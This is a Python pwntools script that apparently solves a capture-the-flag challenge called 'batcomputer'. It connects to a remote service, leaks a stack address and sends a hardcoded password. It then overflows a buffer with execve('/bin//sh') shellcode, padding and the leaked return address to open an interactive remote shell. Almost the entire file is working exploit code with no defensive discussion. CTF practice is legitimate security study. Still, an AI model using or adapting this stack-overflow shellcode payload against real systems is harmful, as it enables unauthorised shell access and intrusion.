#!/usr/bin/python3

'''
    @Author: Lorenzo Invidia
    @Requirements: pwntools
'''

from pwn import *
context(os='linux', arch='i386')
#context.log_level = 'debug'

host = '178.62.0.100'
#host = '127.0.0.1'
#port = 8080
port = 31714

e = ELF('./batcomputer', checksec=False)
# p = gdb.debug(e.path, '''
# break * 0x55555555531e
# continue
# ''')
#p = process(e.path)
p = remote(host, port)

def leak():
    # 1. Trace Joker  
    # 2. Chase Joker
    # >   
    p.recvuntil('> ')
    p.sendline('1')

    # It was very hard, but Alfred managed to locate him: 0x7fffffffdeXX
    ss = p.recv(66)
    #buff_start = p.recv(13)
    return int(ss[52:], 16)

addr = leak()

log.success("Got buffer start: " + str(hex(addr)))

password = 'b4tp@$$w0rd!'
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
padding = b'A' * (0x54 - len(shellcode))

payload = shellcode + padding + p64(addr)

# return addr at addr+4 0x68


def exploit(payload):
    # 1. Trace Joker  
    # 2. Chase Joker
    # >   
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('2')
    
    # Ok. Let's do this. Enter the password: 
    p.recvuntil('password: ')
    p.sendline(password)
    
    # Access Granted. \n
    # Enter the navigation commands:
    p.recvuntil('commands: ')
    p.sendline(payload)

    # 1. Trace Joker  
    # 2. Chase Joker
    # >   
    p.recvuntil('> ')
    p.sendline('3')
    p.interactive()

exploit(payload)